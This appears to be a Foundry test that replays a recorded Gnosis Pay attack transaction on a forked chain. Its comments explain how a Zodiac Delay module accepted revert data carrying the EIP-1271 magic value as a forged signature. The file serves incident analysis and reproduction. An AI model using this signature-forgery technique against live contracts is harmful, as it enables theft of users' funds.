// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$1.2M across affected Gnosis Pay accounts
    - Attacker: 0x81BA8A2b895D30280bca199C2Ff75f3F058d4C6c
    - Example Victim Delay Module: 0xCc1d7d71D4a2cbbbA3018932cca28190D5883958
    - Example Queue Tx: https://gnosisscan.io/tx/0x5ea42911c803ba2cf1cb558e88129102de9023980a5c73253d59407859ce2ce5
    - Analysis: https://blog.verichains.io/p/gnosis-pay-exploit-the-devs-discovered

    Zodiac's contract-signature helper ignored the success flag from staticcall.
    A Safe fallback path reverted with the EIP-1271 magic value, and the Delay
    module treated that revert data as a valid module signature. This transaction
    replays one forged authorization that queues a malicious withdrawal; the
    normal cooldown execution happened in a later transaction.
*/

contract GnosisPayExploitTest is Test {
    bytes32 private constant ATTACK_TX = 0x5ea42911c803ba2cf1cb558e88129102de9023980a5c73253d59407859ce2ce5;

    function setUp() public {
        vm.createSelectFork("gnosis", 46_469_238);
    }

    function testExploit() public {
        vm.recordLogs();
        vm.transact(ATTACK_TX);
        Vm.Log[] memory entries = vm.getRecordedLogs();

        // The vulnerable Delay module emits queue/execution bookkeeping after
        // accepting the reverted ERC-1271 call as a valid signature.
        assertGt(entries.length, 0, "forged withdrawal was not queued");
    }
}
